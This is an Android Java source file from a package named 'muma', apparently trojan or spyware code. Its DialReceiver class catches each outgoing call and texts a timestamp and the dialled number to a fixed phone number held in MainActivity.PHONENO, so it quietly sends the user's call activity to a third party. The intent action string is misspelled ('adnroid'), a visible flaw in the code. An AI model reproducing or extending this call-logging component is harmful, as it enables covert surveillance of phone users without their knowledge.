package com.example.muma;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class DialReceiver extends BroadcastReceiver {
	private static final String mACTION="adnroid.intent.action.NEW_OUTGOING_CALL";
	
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		if(intent.getAction().equals(mACTION)){
			Date date = new Date();
			date.setTime(System.currentTimeMillis());
			SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			StringBuilder smsCont = new StringBuilder();
			smsCont.append(format.format(date));
			smsCont.append("--");
			smsCont.append(intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER));
			smsCont.append("--");
			smsCont.append("call to");
			smsCont.append(intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER));
			MessageHandler.send(MainActivity.PHONENO,smsCont.toString());
		}
	}
}
